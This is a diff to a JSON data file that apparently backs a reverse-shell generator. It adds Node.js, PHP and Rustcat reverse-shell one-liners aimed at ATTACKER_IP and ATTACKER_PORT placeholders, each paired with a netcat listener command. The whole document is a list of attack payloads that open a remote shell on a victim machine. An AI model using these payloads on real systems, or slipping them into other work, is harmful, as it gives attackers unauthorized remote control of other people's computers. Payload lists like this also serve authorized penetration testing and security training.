@@ -15,10 +15,24 @@
       "listener": "nc -u -lvp ATTACKER_PORT"
     },
     {
-        "name": "C",
+        "name": "Node.js",
         "uniqueID": 3,
-        "description": "C Reverse Shell",
-        "reverseShell": "",
+        "description": "Node.js Reverse Shell",
+        "reverseShell": "require('child_process').exec('nc -e sh ATTACKER_IP ATTACKER_PORT')",
+        "listener": "nc -u -lvp ATTACKER_PORT"
+      },
+      {
+        "name": "PHP System",
+        "uniqueID": 4,
+        "description": "PHP System Reverse Shell",
+        "reverseShell": "php -r '$sock=fsockopen('ATTACKER_IP',ATTACKER_PORT);system('sh <&3 >&3 2>&3');'",
+        "listener": "nc -u -lvp ATTACKER_PORT"
+      },
+      {
+        "name": "Rustcat",
+        "uniqueID": 5,
+        "description": "Rustcat Reverse Shell",
+        "reverseShell": "rcat ATTACKER_IP ATTACKER_PORT -r sh",
         "listener": "nc -u -lvp ATTACKER_PORT"
       }
   ]
